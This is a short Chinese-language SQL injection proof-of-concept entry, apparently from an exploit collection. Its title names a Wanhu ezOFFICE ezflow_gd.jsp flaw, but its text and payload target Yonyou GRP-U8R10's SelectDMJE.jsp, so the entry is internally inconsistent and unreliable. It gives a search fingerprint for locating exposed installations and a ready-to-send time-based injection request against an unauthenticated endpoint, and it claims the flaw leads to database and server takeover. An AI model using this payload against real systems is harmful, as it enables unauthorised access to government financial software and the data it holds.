﻿# 万户 ezOFFICE ezflow_gd.jsp SQL注入漏洞

> 更新时间：2024-01-24

> 漏洞编号：

> 漏洞说明：用友GRP-U8R10行政事业内控管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。

用友GRP-U8R10行政事业内控管理软件 SelectDMJE.jsp接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上均受到此漏洞的影响。

> 漏洞特征：app="用友-GRP-U8"

> 验证脚本：HTTP

```
GET /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：万户 ezOFFICE ezflow_gd.jsp SQL注入漏洞.poc
